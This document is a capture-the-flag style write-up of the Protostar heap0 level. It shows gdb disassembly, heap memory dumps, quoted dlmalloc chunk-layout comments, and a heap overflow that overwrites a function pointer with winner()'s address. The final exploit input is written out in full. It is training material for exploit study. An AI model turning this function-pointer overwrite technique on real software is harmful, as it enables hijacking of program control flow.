# For heap0 in Protostar
  
  
In heap0, we want to call the function `winner()`:
```
08048464 <winner>:
 8048464:	55                   	push   ebp
 8048465:	89 e5                	mov    ebp,esp
 8048467:	83 ec 18             	sub    esp,0x18
 804846a:	c7 04 24 d0 85 04 08 	mov    DWORD PTR [esp],0x80485d0
 8048471:	e8 22 ff ff ff       	call   8048398 <puts@plt>
 8048476:	c9                   	leave  
 8048477:	c3                   	ret 
```

But that function is not called anywhere. So let's explore how to call it. As the name implies, it *obviously* involves the heap.
Below is the disassembler dump for the function `main()`:

```
(gdb) disassemble main
Dump of assembler code for function main:
0x0804848c <main+0>:	push   ebp
0x0804848d <main+1>:	mov    ebp,esp
0x0804848f <main+3>:	and    esp,0xfffffff0
0x08048492 <main+6>:	sub    esp,0x20
0x08048495 <main+9>:	mov    DWORD PTR [esp],0x40
0x0804849c <main+16>:	call   0x8048388 <malloc@plt>
0x080484a1 <main+21>:	mov    DWORD PTR [esp+0x18],eax
0x080484a5 <main+25>:	mov    DWORD PTR [esp],0x4
0x080484ac <main+32>:	call   0x8048388 <malloc@plt>
0x080484b1 <main+37>:	mov    DWORD PTR [esp+0x1c],eax
0x080484b5 <main+41>:	mov    edx,0x8048478
0x080484ba <main+46>:	mov    eax,DWORD PTR [esp+0x1c]
0x080484be <main+50>:	mov    DWORD PTR [eax],edx
0x080484c0 <main+52>:	mov    eax,0x80485f7
0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
0x080484d8 <main+76>:	call   0x8048378 <printf@plt>
0x080484dd <main+81>:	mov    eax,DWORD PTR [ebp+0xc]
0x080484e0 <main+84>:	add    eax,0x4
0x080484e3 <main+87>:	mov    eax,DWORD PTR [eax]
0x080484e5 <main+89>:	mov    edx,eax
0x080484e7 <main+91>:	mov    eax,DWORD PTR [esp+0x18]
0x080484eb <main+95>:	mov    DWORD PTR [esp+0x4],edx
0x080484ef <main+99>:	mov    DWORD PTR [esp],eax
0x080484f2 <main+102>:	call   0x8048368 <strcpy@plt>
0x080484f7 <main+107>:	mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:	mov    eax,DWORD PTR [eax]
0x080484fd <main+113>:	call   eax
0x080484ff <main+115>:	leave  
0x08048500 <main+116>:	ret    
End of assembler dump.
```
### (Huge) analysis of disassembler dump
From the disassembler dump above, we can deduce that
1. 0x40 is the size of the memory allocated by the 1st `malloc()`.
2. The pointer pointing to the 1st allocated memory is stored in a variable located at `[esp+0x18]`
Just after the 1st malloc, `malloc()` returns *0x804a008* (the address of the allocated memory of size 0x40). Please note that `malloc()` only returns the memory address. It does not return the chunk address.

This is the memory after the first `malloc()`. While `eax` holds the memory address of the allocated chunk, I want to view the heap metadata for the first allocated memory. So I display memory starting at address `eax-0x4` instead of `eax`.
```
(gdb) x/32x $eax - 0x4
0x804a004:	0x00000049	0x00000000	0x00000000	0x00000000
0x804a014:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a024:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a034:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a044:	0x00000000	0x00000000	0x00020fb9	0x00000000
0x804a054:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a064:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a074:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```
3. 0x4 is the size of the memory allocated by the 2nd `malloc()`.
Just after the 2nd `malloc`, `malloc()` returns *0x804a050* (the address of the allocated memory of size 0x4).
Here, I look at the 1st & 2nd allocated memories to see changes in bytes. We will explore the changes in heap metadata in 3a (see below).
```
(gdb) x/32x 0x804a004-0x4
0x804a000:	0x00000000	0x00000049	0x00000000	0x00000000
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a050:	0x00000000	0x00000000	0x00000000	0x00020fa9
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
```

3a. 0x49 in the memory dump above ^ shows that the chunk is 0x48 bytes big (including heap metadata). 0x11 shows that the chunk is 0x10 bytes big. These sizes are bigger than the specified size of the allocated memory because 
>"the number of bytes reserved for the user by *Doug Lea's Malloc* may actually be greater than the amount of requested dynamic memory (because of the 8 byte alignment)."

To understand what the heap metadata means, see the below excerpt taken from [here](ftp://g.oswego.edu/pub/misc/malloc.c).
```
/* -----------------------  Chunk representations ------------------------ */

/*
  (The following includes lightly edited explanations by Colin Plumb.)

  The malloc_chunk declaration below is misleading (but accurate and
  necessary).  It declares a "view" into memory allowing access to
  necessary fields at known offsets from a given base.

  Chunks of memory are maintained using a `boundary tag' method as
  originally described by Knuth.  (See the paper by Paul Wilson
  ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a survey of such
  techniques.)  Sizes of free chunks are stored both in the front of
  each chunk and at the end.  This makes consolidating fragmented
  chunks into bigger chunks fast.  The head fields also hold bits
  representing whether chunks are free or in use.

  Here are some pictures to make it clearer.  They are "exploded" to
  show that the state of a chunk can be thought of as extending from
  the high 31 bits of the head field of its header through the
  prev_foot and PINUSE_BIT bit of the following chunk header.

  A chunk that's in use looks like:

   chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
           | Size of previous chunk (if P = 0)                             |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |P|
         | Size of this chunk                                         1| +-+
   mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         |                                                               |
         +-                                                             -+
         |                                                               |
         +-                                                             -+
         |                                                               :
         +-      size - sizeof(size_t) available payload bytes          -+
         :                                                               |
 chunk-> +-                                                             -+
         |                                                               |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |1|
       | Size of next chunk (may or may not be in use)               | +-+
 mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    And if it's free, it looks like this:

   chunk-> +-                                                             -+
           | User payload (must be in use, or we would have merged!)       |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |P|
         | Size of this chunk                                         0| +-+
   mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         | Next pointer                                                  |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         | Prev pointer                                                  |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         |                                                               :
         +-      size - sizeof(struct chunk) unused bytes               -+
         :                                                               |
 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         | Size of this chunk                                            |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |0|
       | Size of next chunk (must be in use, or we would have merged)| +-+
 mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                                                               :
       +- User payload                                                -+
       :                                                               |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                                                                     |0|
                                                                     +-+
  Note that since we always merge adjacent free chunks, the chunks
  adjacent to a free chunk must be in use.

  Given a pointer to a chunk (which can be derived trivially from the
  payload pointer) we can, in O(1) time, find out whether the adjacent
  chunks are free, and if so, unlink them from the lists that they
  are on and merge them with the current chunk.

  Chunks always begin on even word boundaries, so the mem portion
  (which is returned to the user) is also on an even word boundary, and
  thus at least double-word aligned.

  The P (PINUSE_BIT) bit, stored in the unused low-order bit of the
  chunk size (which is always a multiple of two words), is an in-use
  bit for the *previous* chunk.  If that bit is *clear*, then the
  word before the current chunk size contains the previous chunk
  size, and can be used to find the front of the previous chunk.
  The very first chunk allocated always has this bit set, preventing
  access to non-existent (or non-owned) memory. If pinuse is set for
  any given chunk, then you CANNOT determine the size of the
  previous chunk, and might even get a memory addressing fault when
  trying to do so.

  The C (CINUSE_BIT) bit, stored in the unused second-lowest bit of
  the chunk size redundantly records whether the current chunk is
  inuse (unless the chunk is mmapped). This redundancy enables usage
  checks within free and realloc, and reduces indirection when freeing
  and consolidating chunks.

  Each freshly allocated chunk must have both cinuse and pinuse set.
  That is, each allocated chunk borders either a previously allocated
  and still in-use chunk, or the base of its memory arena. This is
  ensured by making all allocations from the `lowest' part of any
  found chunk.  Further, no free chunk physically borders another one,
  so each free chunk is known to be preceded and followed by either
  inuse chunks or the ends of memory.

  Note that the `foot' of the current chunk is actually represented
  as the prev_foot of the NEXT chunk. This makes it easier to
  deal with alignments etc but can be very confusing when trying
  to extend or adapt this code.

  The exceptions to all this are

     1. The special chunk `top' is the top-most available chunk (i.e.,
        the one bordering the end of available memory). It is treated
        specially.  Top is never included in any bin, is used only if
        no other chunk is available, and is released back to the
        system if it is very large (see M_TRIM_THRESHOLD).  In effect,
        the top chunk is treated as larger (and thus less well
        fitting) than any other available chunk.  The top chunk
        doesn't update its trailing size field since there is no next
        contiguous chunk that would have to index off it. However,
        space is still allocated for it (TOP_FOOT_SIZE) to enable
        separation or merging when space is extended.

     3. Chunks allocated via mmap, have both cinuse and pinuse bits
        cleared in their head fields.  Because they are allocated
        one-by-one, each must carry its own prev_foot field, which is
        also used to hold the offset this chunk has within its mmapped
        region, which is needed to preserve alignment. Each mmapped
        chunk is trailed by the first two fields of a fake next-chunk
        for sake of usage checks.

*/

struct malloc_chunk {
  size_t               prev_foot;  /* Size of previous chunk (if free).  */
  size_t               head;       /* Size and inuse bits. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};

typedef struct malloc_chunk  mchunk;
typedef struct malloc_chunk* mchunkptr;
typedef struct malloc_chunk* sbinptr;  /* The type of bins of chunks */
typedef unsigned int bindex_t;         /* Described below */
typedef unsigned int binmap_t;         /* Described below */
typedef unsigned int flag_t;           /* The type of various bit flag sets */
```
I have no idea what *0x20fb9* and *0x20fa9* mean apart from the fact they are the metadata of the *heap wilderness*. I also know that somehow the size of the wilderness is involved. After the 2nd chunk (of size 0x10) was allocated, the heap wilderness metadata was reduced by *0x10* from *0x20fb9* to *0x20fa9*.

4. The pointer pointing to the 2nd allocated memory is stored in a variable located at `[esp+0x1c]`
5. We store the value *0x8048478* in the 2nd allocated memory.
6. The following snippet of code from the `main()` function...
```
0x080484c0 <main+52>:	mov    eax,0x80485f7 	;0x80485f7 contains string "data is at %p, fp is at %p\n"
0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
0x080484d8 <main+76>:	call   0x8048378 <printf@plt>
```
... prints the following output to stdout - "data is at 0x804a008, fp is at 0x804a050"

7. The following snippet of code from the main() function...
```
0x080484dd <main+81>:	mov    eax,DWORD PTR [ebp+0xc]
0x080484e0 <main+84>:	add    eax,0x4
0x080484e3 <main+87>:	mov    eax,DWORD PTR [eax]
0x080484e5 <main+89>:	mov    edx,eax
0x080484e7 <main+91>:	mov    eax,DWORD PTR [esp+0x18]
0x080484eb <main+95>:	mov    DWORD PTR [esp+0x4],edx
0x080484ef <main+99>:	mov    DWORD PTR [esp],eax
0x080484f2 <main+102>:	call   0x8048368 <strcpy@plt>
```
... prepares strcpy to copy values from a src to dest. This is the pseudocode of the code snippet: 
```
The value of a variable stored in [ebp+0xc] is stored in eax. Eax is then incrememnted by 4. Eax has to contain a valid memory address as eax is then assigned the value stored at a memory address stored in eax.
Eax is then stored in edx, and gets assigned the value in [esp+0x18]. Strcpy copies the value at the memory location stored in [edx] (unknown source) to the memory location stored in [eax] (ie the 1st allocated memory).
```
8. Lastly, the values stored in location `[esp + 0x1c]` (ie the 2nd allocated memory),which is a memory address, is stored in `eax`. `Eax` is then assigned the value stored in the memory address it contains. `Eax` function is then called.

With reference to point 7 of the deduction of `<main>` above, turns out the unknown source of `strcpy` is the argument when `./heap0` is called. The *"src=0x0"* error message below tells us so - 
```
Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x804a008 "", src=0x0) at strcpy.c:39
39	strcpy.c: No such file or directory.
	in strcpy.c
```
This is because src should not be 0x0. It is invalid. This means the program is lacking something. It needs an input. Since there is no input requested in `stdin`, it could be that it is supplied via arguments when the program is called.

### Testing the concept

From `<main>` and the output of the heap, I know I have to override the memory at location *0x804a050* with the address of `<winner>`. And so I experimented with the following input - `"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcde"`. The *'a'* floods the heap, allowing *'bcde'* to be stored in memory address *0x804a050* (as *0x65646362*). The program thus tries to execute code at the memory address *0x65646362*.
The output is below.
```
(gdb) start aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcde
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Temporary breakpoint 7 at 0x8048495: file heap0/heap0.c, line 30.
Starting program: /opt/protostar/bin/heap0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcde

Temporary breakpoint 7, main (argc=2, argv=0xbffff704) at heap0/heap0.c:30
30	in heap0/heap0.c
0x08048495 <main+9>:	 c7 04 24 40 00 00 00	mov    DWORD PTR [esp],0x40
0x0804849c <main+16>:	 e8 e7 fe ff ff	call   0x8048388 <malloc@plt>
0x080484a1 <main+21>:	 89 44 24 18	mov    DWORD PTR [esp+0x18],eax
(gdb) c
Continuing.

Breakpoint 6, 0x080484b1 in main (argc=2, argv=0xbffff704) at heap0/heap0.c:31
31	in heap0/heap0.c
0x080484b1 <main+37>:	 89 44 24 1c	mov    DWORD PTR [esp+0x1c],eax
(gdb) break *0x080484b1
Note: breakpoint 6 also set at pc 0x80484b1.
Breakpoint 8 at 0x80484b1: file heap0/heap0.c, line 31.
(gdb) x/32x 0x804a004
0x804a004:	0x00000049	0x00000000	0x00000000	0x00000000
0x804a014:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a024:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a034:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a044:	0x00000000	0x00000000	0x00000011	0x00000000
0x804a054:	0x00000000	0x00000000	0x00020fa9	0x00000000
0x804a064:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a074:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
data is at 0x804a008, fp is at 0x804a050

Breakpoint 1, main (argc=2, argv=0xbffff704) at heap0/heap0.c:38
38	in heap0/heap0.c
0x080484f7 <main+107>:	 8b 44 24 1c	mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:	 8b 00	mov    eax,DWORD PTR [eax]
0x080484fd <main+113>:	 ff d0	call   eax
(gdb) x/32x 0x804a004
0x804a004:	0x00000049	0x61616161	0x61616161	0x61616161
0x804a014:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a024:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a034:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a044:	0x61616161	0x61616161	0x61616161	0x65646362
0x804a054:	0x00000000	0x00000000	0x00020fa9	0x00000000
0x804a064:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a074:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x65646362 in ?? ()
0x65646362:	Cannot access memory at address 0x65646362
(gdb) disassemble winner
Dump of assembler code for function winner:
0x08048464 <winner+0>:	push   ebp
0x08048465 <winner+1>:	mov    ebp,esp
0x08048467 <winner+3>:	sub    esp,0x18
0x0804846a <winner+6>:	mov    DWORD PTR [esp],0x80485d0
0x08048471 <winner+13>:	call   0x8048398 <puts@plt>
0x08048476 <winner+18>:	leave  
0x08048477 <winner+19>:	ret    
End of assembler dump.
(gdb) 
```

The concept works. (\~‾▿‾)\~  All that's needed now is to replace` 'bcde`' with the actual address of` <winner>` (which is *0x8048464*). Note that it has to be entered as `\x64\x84\x04\x08` due to little-endianness.
This gives us the winning input. See below.

```
user@protostar:/opt/protostar/bin$ echo -e '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x64\x84\x04\x08' | xargs ./heap0
data is at 0x804a008, fp is at 0x804a050
level passed
```
##### Special note to myself
I faced problem trying to insert hex values as argument in gdb so I could troubleshoot the winning input. `set args` command in gdb does not work with hex values. 

END
